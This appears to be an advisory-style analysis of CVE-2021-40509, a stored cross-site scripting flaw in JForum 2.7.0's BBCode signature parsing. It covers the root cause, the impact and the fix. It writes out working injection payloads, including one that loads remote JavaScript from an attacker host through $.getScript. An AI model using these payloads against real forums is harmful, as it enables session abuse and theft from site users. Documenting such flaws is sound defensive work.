Based on the provided content, here's an analysis of CVE-2021-40509:

**Root Cause of Vulnerability:**
The root cause is insufficient sanitization of user-provided input in JForum 2.7.0, specifically within the user's profile signature field. The application improperly handles BBCode tags, allowing the injection of arbitrary HTML attributes.

**Weaknesses/Vulnerabilities Present:**
- **Stored Cross-Site Scripting (XSS):** The core vulnerability is a stored XSS issue. Malicious JavaScript code can be injected through specially crafted BBCode tags within the user signature.
- **Insecure BBCode Parsing:** The parsing of BBCode tags like `[color]`, `[img]`, and `[url]` is flawed, allowing the injection of `onMouseOver` attributes.

**Impact of Exploitation:**
- **Arbitrary JavaScript Execution:**  An attacker can execute arbitrary JavaScript code in the context of other users' browsers who view the compromised profile.
- **Session Hijacking/Cookie Theft:** Although HTTP-only cookies are set, the attacker can use `$.getScript()` to load and execute malicious JavaScript from a remote server. This allows the attacker to steal session information, redirect users, perform actions on behalf of the user, or deface the website.

**Attack Vectors:**
- **User Profile Signature:** The vulnerability is triggered when a user views a profile that has a malicious script embedded in the user signature using specially crafted BBCode tags.

**Required Attacker Capabilities/Position:**
- **Authenticated User:** An attacker needs to be an authenticated user of the JForum application to modify their profile and inject the malicious code.
- **Basic Knowledge of HTML/JavaScript:** The attacker needs a basic understanding of how to use HTML attributes (e.g. onmouseover) and how to include javascript using `$.getScript()`.

**Technical Details:**
- **BBCode Injection Examples:**
    -  `[color=red" onMouseOver="alert('xss')]XSS[/color]` injects the `onMouseOver` attribute into the `<font>` tag which is rendered from the BBCode.
    -  `[color=red" onMouseOver="$.getScript('http://192.168.45.148:8080/evil.js');"]XSS[/color]` also injects `onMouseOver` attribute and loads a malicious javascript file from the specified URL
    -  `[img]/demo.jpg" onMouseOver="alert('xss')[/img]`  injects the `onMouseOver` attribute into the `<img>` tag.
    -  `[url='<http://www.demo.com>" onMouseOver="alert('xss')']test[/url]` injects the `onMouseOver` attribute into the `<a>` tag.
- **HTML Rendering:** The vulnerability is demonstrated by showing the resulting HTML after the BBCode is parsed. The injected attributes are not escaped or removed and are rendered to the browser which executes the injected javascript.
- **Bypass HTTP-only Cookie:** The attacker can use the `$.getScript()` to load and execute a javascript file despite the cookie being set to HTTP only. This allows the attacker to perform actions that require a cookie or the user's session.
- **Fix:** The issue has been fixed in the JForum code with commit ID 934, which can be seen at the provided link.
